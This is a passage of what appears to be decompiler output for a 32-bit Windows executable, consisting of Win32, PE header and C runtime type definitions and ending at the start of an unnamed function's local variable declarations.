typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined5;
typedef unsigned long long    undefined6;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    dword hash;
    void *spare;
    char name[0];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor *pType;
    ptrdiff_t dispCatchObj;
    void *addressOfHandler;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

typedef int __ehstate_t;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType *pHandlerArray;
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

typedef struct _s_ESTypeList _s_ESTypeList, *P_s_ESTypeList;

typedef struct _s_ESTypeList ESTypeList;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry *pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry *pTryBlockMap;
    uint nIPMapEntries;
    void *pIPToStateMap;
    ESTypeList *pESTypeList;
    int EHFlags;
};

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (*action)(void);
};

struct _s_ESTypeList {
    int nCount;
    HandlerType *pTypeArray;
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef struct _s_FuncInfo FuncInfo;

typedef ulonglong __uint64;

typedef struct tagPAINTSTRUCT tagPAINTSTRUCT, *PtagPAINTSTRUCT;

typedef struct tagPAINTSTRUCT PAINTSTRUCT;

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ *HDC;

typedef int BOOL;

typedef struct tagRECT tagRECT, *PtagRECT;

typedef struct tagRECT RECT;

typedef uchar BYTE;

typedef long LONG;

struct HDC__ {
    int unused;
};

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

struct tagPAINTSTRUCT {
    HDC hdc;
    BOOL fErase;
    RECT rcPaint;
    BOOL fRestore;
    BOOL fIncUpdate;
    BYTE rgbReserved[32];
};

typedef int INT_PTR;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef INT_PTR (*DLGPROC)(HWND, UINT, WPARAM, LPARAM);

struct HWND__ {
    int unused;
};

typedef struct tagPAINTSTRUCT *LPPAINTSTRUCT;

typedef LONG_PTR LRESULT;

typedef LRESULT (*WNDPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct tagWNDCLASSEXW tagWNDCLASSEXW, *PtagWNDCLASSEXW;

typedef struct tagWNDCLASSEXW WNDCLASSEXW;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

typedef struct HICON__ HICON__, *PHICON__;

typedef struct HICON__ *HICON;

typedef HICON HCURSOR;

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

typedef struct HBRUSH__ *HBRUSH;

typedef wchar_t WCHAR;

typedef WCHAR *LPCWSTR;

struct HBRUSH__ {
    int unused;
};

struct HICON__ {
    int unused;
};

struct HINSTANCE__ {
    int unused;
};

struct tagWNDCLASSEXW {
    UINT cbSize;
    UINT style;
    WNDPROC lpfnWndProc;
    int cbClsExtra;
    int cbWndExtra;
    HINSTANCE hInstance;
    HICON hIcon;
    HCURSOR hCursor;
    HBRUSH hbrBackground;
    LPCWSTR lpszMenuName;
    LPCWSTR lpszClassName;
    HICON hIconSm;
};

typedef struct _cpinfo _cpinfo, *P_cpinfo;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo *LPCPINFO;

typedef ulong DWORD;

typedef DWORD LCTYPE;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef ushort WORD;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef WCHAR *LPWSTR;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _IMAGE_SECTION_HEADER _IMAGE_SECTION_HEADER, *P_IMAGE_SECTION_HEADER;

typedef union _union_226 _union_226, *P_union_226;

union _union_226 {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
};

struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union _union_226 Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
};

typedef struct _IMAGE_SECTION_HEADER *PIMAGE_SECTION_HEADER;

typedef WCHAR *LPWCH;

typedef struct _OSVERSIONINFOW _OSVERSIONINFOW, *P_OSVERSIONINFOW;

typedef struct _OSVERSIONINFOW *LPOSVERSIONINFOW;

struct _OSVERSIONINFOW {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    WCHAR szCSDVersion[128];
};

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef CHAR *LPCH;

typedef struct _OSVERSIONINFOA _OSVERSIONINFOA, *P_OSVERSIONINFOA;

struct _OSVERSIONINFOA {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    CHAR szCSDVersion[128];
};

typedef LARGE_INTEGER *PLARGE_INTEGER;

typedef struct _OSVERSIONINFOA *LPOSVERSIONINFOA;

typedef DWORD ACCESS_MASK;

typedef DWORD LCID;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR DWORD_PTR;

typedef ULONG_PTR SIZE_T;

typedef void (*_PHNDLR)(int);

typedef struct _strflt _strflt, *P_strflt;

struct _strflt {
    int sign;
    int decpt;
    int flag;
    char *mantissa;
};

typedef enum enum_3272 {
    INTRNCVT_OK=0,
    INTRNCVT_OVERFLOW=1,
    INTRNCVT_UNDERFLOW=2
} enum_3272;

typedef enum enum_3272 INTRNCVT_STATUS;

typedef struct _strflt *STRFLT;

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct HACCEL__ HACCEL__, *PHACCEL__;

struct HACCEL__ {
    int unused;
};

typedef struct HACCEL__ *HACCEL;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef struct HMENU__ HMENU__, *PHMENU__;

typedef struct HMENU__ *HMENU;

struct HMENU__ {
    int unused;
};

typedef struct _FILETIME *LPFILETIME;

typedef int (*FARPROC)(void);

typedef WORD *LPWORD;

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef int INT;

typedef WORD ATOM;

typedef HANDLE HGLOBAL;

typedef BOOL *LPBOOL;

typedef BYTE *PBYTE;

typedef void *LPCVOID;

typedef struct HRSRC__ *HRSRC;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_20 IMAGE_RESOURCE_DIR_STRING_U_20, *PIMAGE_RESOURCE_DIR_STRING_U_20;

struct IMAGE_RESOURCE_DIR_STRING_U_20 {
    word Length;
    wchar16 NameString[10];
};

typedef struct IMAGE_DEBUG_DIRECTORY IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY;

struct IMAGE_DEBUG_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword Type;
    dword SizeOfData;
    dword AddressOfRawData;
    dword PointerToRawData;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char *_ptr;
    int _cnt;
    char *_base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char *_tmpfname;
};

typedef struct _iobuf FILE;

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef char *va_list;

typedef uint uintptr_t;

typedef struct _tiddata _tiddata, *P_tiddata;

typedef struct _tiddata *_ptiddata;

typedef struct threadmbcinfostruct threadmbcinfostruct, *Pthreadmbcinfostruct;

typedef struct threadmbcinfostruct *pthreadmbcinfo;

typedef struct threadlocaleinfostruct threadlocaleinfostruct, *Pthreadlocaleinfostruct;

typedef struct threadlocaleinfostruct *pthreadlocinfo;

typedef struct setloc_struct setloc_struct, *Psetloc_struct;

typedef struct setloc_struct _setloc_struct;

typedef struct localerefcount localerefcount, *Plocalerefcount;

typedef struct localerefcount locrefcount;

typedef struct lconv lconv, *Plconv;

typedef struct __lc_time_data __lc_time_data, *P__lc_time_data;

typedef struct _is_ctype_compatible _is_ctype_compatible, *P_is_ctype_compatible;

struct lconv {
    char *decimal_point;
    char *thousands_sep;
    char *grouping;
    char *int_curr_symbol;
    char *currency_symbol;
    char *mon_decimal_point;
    char *mon_thousands_sep;
    char *mon_grouping;
    char *positive_sign;
    char *negative_sign;
    char int_frac_digits;
    char frac_digits;
    char p_cs_precedes;
    char p_sep_by_space;
    char n_cs_precedes;
    char n_sep_by_space;
    char p_sign_posn;
    char n_sign_posn;
    wchar_t *_W_decimal_point;
    wchar_t *_W_thousands_sep;
    wchar_t *_W_int_curr_symbol;
    wchar_t *_W_currency_symbol;
    wchar_t *_W_mon_decimal_point;
    wchar_t *_W_mon_thousands_sep;
    wchar_t *_W_positive_sign;
    wchar_t *_W_negative_sign;
};

struct _is_ctype_compatible {
    ulong id;
    int is_clike;
};

struct setloc_struct {
    wchar_t *pchLanguage;
    wchar_t *pchCountry;
    int iLocState;
    int iPrimaryLen;
    BOOL bAbbrevLanguage;
    BOOL bAbbrevCountry;
    UINT _cachecp;
    wchar_t _cachein[131];
    wchar_t _cacheout[131];
    struct _is_ctype_compatible _Loc_c[5];
    wchar_t _cacheLocaleName[85];
};

struct threadmbcinfostruct {
    int refcount;
    int mbcodepage;
    int ismbcodepage;
    ushort mbulinfo[6];
    uchar mbctype[257];
    uchar mbcasemap[256];
    wchar_t *mblocalename;
};

struct localerefcount {
    char *locale;
    wchar_t *wlocale;
    int *refcount;
    int *wrefcount;
};

struct threadlocaleinfostruct {
    int refcount;
    uint lc_codepage;
    uint lc_collate_cp;
    uint lc_time_cp;
    locrefcount lc_category[6];
    int lc_clike;
    int mb_cur_max;
    int *lconv_intl_refcount;
    int *lconv_num_refcount;
    int *lconv_mon_refcount;
    struct lconv *lconv;
    int *ctype1_refcount;
    ushort *ctype1;
    ushort *pctype;
    uchar *pclmap;
    uchar *pcumap;
    struct __lc_time_data *lc_time_curr;
    wchar_t *locale_name[6];
};

struct _tiddata {
    ulong _tid;
    uintptr_t _thandle;
    int _terrno;
    ulong _tdoserrno;
    uint _fpds;
    ulong _holdrand;
    char *_token;
    wchar_t *_wtoken;
    uchar *_mtoken;
    char *_errmsg;
    wchar_t *_werrmsg;
    char *_namebuf0;
    wchar_t *_wnamebuf0;
    char *_namebuf1;
    wchar_t *_wnamebuf1;
    char *_asctimebuf;
    wchar_t *_wasctimebuf;
    void *_gmtimebuf;
    char *_cvtbuf;
    uchar _con_ch_buf[5];
    ushort _ch_buf_used;
    void *_initaddr;
    void *_initarg;
    void *_pxcptacttab;
    void *_tpxcptinfoptrs;
    int _tfpecode;
    pthreadmbcinfo ptmbcinfo;
    pthreadlocinfo ptlocinfo;
    int _ownlocale;
    ulong _NLG_dwCode;
    void *_terminate;
    void *_unexpected;
    void *_translator;
    void *_purecall;
    void *_curexception;
    void *_curcontext;
    int _ProcessingThrow;
    void *_curexcspec;
    void *_pFrameInfoChain;
    _setloc_struct _setloc_data;
    void *_reserved1;
    void *_reserved2;
    void *_reserved3;
    void *_reserved4;
    void *_reserved5;
    int _cxxReThrow;
    ulong __initDomain;
    int _initapartment;
};

struct __lc_time_data {
    char *wday_abbr[7];
    char *wday[7];
    char *month_abbr[12];
    char *month[12];
    char *ampm[2];
    char *ww_sdatefmt;
    char *ww_ldatefmt;
    char *ww_timefmt;
    int ww_caltype;
    int refcount;
    wchar_t *_W_wday_abbr[7];
    wchar_t *_W_wday[7];
    wchar_t *_W_month_abbr[12];
    wchar_t *_W_month[12];
    wchar_t *_W_ampm[2];
    wchar_t *_W_ww_sdatefmt;
    wchar_t *_W_ww_ldatefmt;
    wchar_t *_W_ww_timefmt;
    wchar_t *_W_ww_locale_name;
};

typedef struct EHRegistrationNode EHRegistrationNode, *PEHRegistrationNode;

struct EHRegistrationNode { // PlaceHolder Structure
};

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;

struct _s_CatchableType { // PlaceHolder Structure
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Structure
};

typedef enum _EXCEPTION_DISPOSITION {
} _EXCEPTION_DISPOSITION;

typedef struct EHExceptionRecord EHExceptionRecord, *PEHExceptionRecord;

struct EHExceptionRecord { // PlaceHolder Structure
};

typedef struct TranslatorGuardRN TranslatorGuardRN, *PTranslatorGuardRN;

struct TranslatorGuardRN { // PlaceHolder Structure
};

typedef struct _LocaleUpdate _LocaleUpdate, *P_LocaleUpdate;

struct _LocaleUpdate { // PlaceHolder Structure
};

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Structure
};

typedef struct bad_alloc bad_alloc, *Pbad_alloc;

struct bad_alloc { // PlaceHolder Structure
};

typedef struct _LDBL12 _LDBL12, *P_LDBL12;

struct _LDBL12 {
    uchar ld12[12];
};

typedef struct _CRT_FLOAT _CRT_FLOAT, *P_CRT_FLOAT;

struct _CRT_FLOAT {
    float f;
};

typedef struct _CRT_DOUBLE _CRT_DOUBLE, *P_CRT_DOUBLE;

struct _CRT_DOUBLE {
    double x;
};

typedef int (*_onexit_t)(void);

typedef uint size_t;

typedef ushort wint_t;

typedef struct localeinfo_struct localeinfo_struct, *Plocaleinfo_struct;

struct localeinfo_struct {
    pthreadlocinfo locinfo;
    pthreadmbcinfo mbcinfo;
};

typedef int errno_t;

typedef int intptr_t;

typedef struct localeinfo_struct *_locale_t;

typedef size_t rsize_t;

typedef ushort wctype_t;




void FUN_00401000(void)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  wchar_t *pwVar3;
  int iVar4;
